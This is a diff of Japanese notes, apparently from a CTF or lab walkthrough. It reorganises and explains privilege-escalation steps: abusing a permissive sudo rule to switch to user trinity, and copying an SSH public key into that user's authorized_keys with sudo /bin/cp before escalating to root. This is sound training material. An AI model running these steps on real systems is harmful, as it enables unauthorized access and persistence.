@@ -31,18 +31,23 @@
   - pkexecがある 
 - sudo -l
   - 3つあるが、下のが一番簡単なので、これを利用する。/bin/cpはshenron1でやっているので参考にする 
-  - (ALL) ALL
-    - 次のでtrinityになれる
-    - `sudo -u trinity bash -i`
-    - `sudo su trinity` 
-  - (追記) `/bin/cp`を使う
-    - `ssh-keygen`で鍵を作る。全部enterでOK
-    - `cp /home/guest/.ssh/id_rsa.pub /tmp` /tmpに鍵を移動させる
-    - `cd tmp;chmod 644 id_rsa.pub` /tmpに移動して、trinityでも使えるように権限を変える
-    - `sudo -u trinity /bin/cp id_rsa.pub /home/trinity/.ssh/authorized_keys`
-    - `ssh trinity@localhost` 
 - root
   - `sudo su`     
 
 ## 補足
+### プロンプトがない
 - trinityになったときにプロンプトがないのは、`.bashrc`がないため
+- guestの`.bashrc`を見てみると、PS1='\~`があるが、これがプロンプトのフォーマット
+### trinityにユーザ切り替え
+- sudo -l
+  - (ALL) ALL
+    - この初めの(ALL)全てのユーザになれるという意味で、次のALLは全てのコマンドが使えるという意味。
+    - つまり次のでtrinityになれる
+    - `sudo -u trinity bash -i`
+    - `sudo su trinity` 
+  - (追記) `/bin/cp`を使う
+    - `ssh-keygen`で鍵を作る。全部enterでOK
+    - `cp /home/guest/.ssh/id_rsa.pub /tmp` /tmpに鍵を移動させる。/tmpに移動させる理由は、guestの.sshのフォルダのパーミッションは`rwx------`になっていて、trinityからはguestのフォルダの中を読み取ることができない。
+    - `cd tmp;chmod 644 id_rsa.pub` /tmpに移動して、trinityでも使えるように権限を変える
+    - `sudo -u trinity /bin/cp id_rsa.pub /home/trinity/.ssh/authorized_keys`
+    - `ssh trinity@localhost` 
